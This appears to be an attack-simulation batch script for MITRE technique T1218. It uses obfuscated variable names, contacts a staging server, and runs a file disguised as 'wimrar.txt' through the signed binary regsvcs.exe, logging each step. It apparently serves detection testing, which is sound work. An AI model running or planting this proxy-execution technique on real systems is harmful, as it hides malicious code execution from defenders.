@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\7630\826fb258
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7630-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=wimrar.txt
SET ewjmdkff=7630

SET kxztml=T1218
SET wqvjy=Signed Binary Proxy Execution
SET hgpwj=!APPDATA!\!pudaazx!\macula-simulations.log

REM Step 1: Check server availability
SET rjdw=0
SET rtkf=
curl -k -s -o nul !drguvr! && (SET rjdw=1) || (SET rjdw=0&SET rtkf=connection_failed)

SET wwxpr=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2!
SET xgrbq=!TIME:~0,2!\!TIME:~3,2!\!TIME:~6,2!.!TIME:~9,3!
SET aunmh=[!wwxpr! !xgrbq:\=:!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!kxztml!|!wqvjy!=!rjdw!:!rtkf!
>>!hgpwj! echo !aunmh! 2>nul || >nul

IF !rjdw! EQU 0 exit /b

REM Step 2: Change directory
cd /d !pjkcpgw! 2>nul
IF NOT !errorlevel! EQU 0 (
    SET btpys=0
    SET vqwz=cd_failed
    SET aunmh=[!wwxpr! !xgrbq:\=:!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!kxztml!|!wqvjy!=!btpys!:!vqwz!
    >>!hgpwj! echo !aunmh! 2>nul || >nul
    exit /b
)

REM Step 3: Execute DLL with regsvcs.exe
SET btpys=0
SET vqwz=
regsvcs.exe !syjfr! 2>nul
IF !errorlevel! EQU 0 (
    SET btpys=1
) ELSE (
    SET btpys=0
    SET vqwz=assembly_load_failed
)

SET aunmh=[!wwxpr! !xgrbq:\=:!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!kxztml!|!wqvjy!=!btpys!:!vqwz!
>>!hgpwj! echo !aunmh! 2>nul || >nul